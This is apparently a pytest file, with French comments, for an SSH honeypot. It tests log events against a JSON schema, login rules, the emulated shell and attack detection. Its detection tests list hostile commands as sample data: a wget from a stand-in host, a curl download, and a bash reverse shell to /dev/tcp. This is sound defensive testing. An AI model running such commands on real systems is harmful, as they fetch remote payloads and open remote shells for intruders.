"""Tests du honeypot SSH (EPIC-1).

Le test central (``test_all_event_types_conform_to_schema``) valide chaque type
d'événement émis par le honeypot contre ``docs/event.schema.json`` : c'est la
garantie que « les logs == le schéma ».
"""

import json
from pathlib import Path

import pytest
from commands import ShellState, run_command
from config import Credential, load_config
from detection import (
    SessionProfiler,
    classify_command,
    detect_malware,
    is_escalation,
)
from events import build_event, normalize_ipv4
from jsonschema import Draft7Validator

SCHEMA_PATH = Path(__file__).resolve().parents[3] / "docs" / "event.schema.json"


@pytest.fixture(scope="module")
def validator() -> Draft7Validator:
    schema = json.loads(SCHEMA_PATH.read_text(encoding="utf-8"))
    return Draft7Validator(schema, format_checker=Draft7Validator.FORMAT_CHECKER)


def _validate(validator: Draft7Validator, event: dict) -> None:
    errors = sorted(validator.iter_errors(event), key=lambda e: e.path)
    assert not errors, "\n".join(f"{list(e.path)}: {e.message}" for e in errors)


# --- conformité au schéma (US-01) -------------------------------------------
def test_all_event_types_conform_to_schema(validator: Draft7Validator) -> None:
    common = {"src_ip": "203.0.113.7", "src_port": 51234, "session_id": "sess-1"}

    events = [
        build_event(event_type="connection", payload={}, **common),
        build_event(
            event_type="auth_attempt",
            payload={"username": "admin", "password": "admin123", "auth_method": "password"},
            **common,
        ),
        build_event(
            event_type="auth_attempt",
            payload={
                "username": "root",
                "auth_method": "publickey",
                "key_fingerprint": "SHA256:abcdef0123456789",
            },
            **common,
        ),
        build_event(
            event_type="auth_success",
            payload={"username": "admin", "password": "admin123", "auth_method": "password"},
            **common,
        ),
        build_event(
            event_type="command",
            payload={"command": "wget http://evil.tld/x.sh"},
            classification=classify_command("wget http://evil.tld/x.sh"),
            **common,
        ),
        build_event(
            event_type="command",
            payload={"command": "sudo su", "target_user": "root"},
            classification=classify_command("sudo su"),
            **common,
        ),
        build_event(
            event_type="disconnection",
            payload={
                "command_count": 2,
                "commands": ["whoami", "sudo su"],
                "session_fingerprint": "deadbeef",
                "duration_ms": 4200,
            },
            classification=SessionProfiler(commands=["whoami", "sudo su"]).session_classification(),
            **common,
        ),
    ]

    for event in events:
        _validate(validator, event)


def test_auth_attempt_carries_required_fields(validator: Draft7Validator) -> None:
    event = build_event(
        event_type="auth_attempt",
        src_ip="198.51.100.4",
        src_port=2222,
        session_id="s",
        payload={"username": "ubuntu", "password": "ubuntu", "auth_method": "password"},
    )
    _validate(validator, event)
    # Champs exigés par US-27.
    assert event["src_ip"] and event["timestamp"]
    assert event["payload"]["username"] == "ubuntu"
    assert event["payload"]["password"] == "ubuntu"


def test_ipv4_normalization() -> None:
    assert normalize_ipv4("::ffff:192.0.2.10") == "192.0.2.10"
    assert normalize_ipv4("::1") == "127.0.0.1"
    assert normalize_ipv4("10.0.0.5") == "10.0.0.5"


# --- comptes restreints (US-03) ---------------------------------------------
def test_root_login_always_refused() -> None:
    config = load_config()
    config.allowed_credentials.append(Credential("root", "toor"))  # même listé...
    assert config.is_allowed("root", "toor") is False  # ...root reste refusé


def test_default_credentials_accepted() -> None:
    config = load_config()
    assert config.is_allowed("admin", "admin123") is True
    assert config.is_allowed("admin", "wrong") is False


# --- émulateur de commandes (US-02) -----------------------------------------
def test_fixed_command_outputs() -> None:
    state = ShellState(user="admin", cwd="/home/admin")
    assert run_command(state, "whoami") == "admin"
    assert run_command(state, "id").startswith("uid=1000(admin)")
    assert "Debian" in run_command(state, "uname -a")
    assert "bookworm" in run_command(state, "cat /etc/os-release")


def test_unknown_command_returns_not_found() -> None:
    state = ShellState()
    assert run_command(state, "foobar123") == "bash: foobar123: command not found"


def test_shell_never_leaks_real_env() -> None:
    state = ShellState(user="admin")
    out = run_command(state, "env")
    assert "USER=admin" in out and "HOSTNAME=prod-srv-01" in out


def test_prompt_reflects_user_then_root() -> None:
    state = ShellState(user="admin", cwd="/home/admin")
    assert state.prompt() == "admin@prod-srv-01:~$ "
    state.escalate_to_root()
    assert state.prompt() == "root@prod-srv-01:~# "
    assert run_command(state, "whoami") == "root"
    assert run_command(state, "pwd") == "/root"


# --- détection (US-04, US-05, US-06, US-07) ---------------------------------
def test_malware_detection_critical() -> None:
    for line in ("wget http://x/m", "curl -O http://x", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"):
        assert detect_malware(line)
        cls = classify_command(line)
        assert cls is not None and cls["severity"] == "critical"


def test_escalation_detection_high() -> None:
    for line in ("sudo su", "su root", "sudo -i"):
        assert is_escalation(line)
    cls = classify_command("sudo su")
    assert cls is not None and cls["severity"] == "high"


def test_benign_command_no_classification() -> None:
    assert classify_command("ls -la") is None


def test_bot_vs_human_profiling() -> None:
    # Exécution non interactive => bot.
    bot = SessionProfiler(interactive=False)
    assert bot.profile() == "bot"

    # Cadence très rapide et régulière => bot.
    fast = SessionProfiler()
    for i in range(6):
        fast.record(f"cmd{i}", i * 0.05)
    assert fast.profile() == "bot"

    # Cadence humaine espacée => human.
    human = SessionProfiler()
    for i, t in enumerate([0.0, 2.0, 5.5, 9.0]):
        human.record(f"cmd{i}", t)
    assert human.profile() == "human"


def test_fingerprint_is_stable_and_sequence_sensitive() -> None:
    a = SessionProfiler(commands=["whoami", "id", "sudo su"])
    b = SessionProfiler(commands=["whoami", "id", "sudo su"])
    c = SessionProfiler(commands=["id", "whoami", "sudo su"])
    assert a.fingerprint() == b.fingerprint()
    assert a.fingerprint() != c.fingerprint()
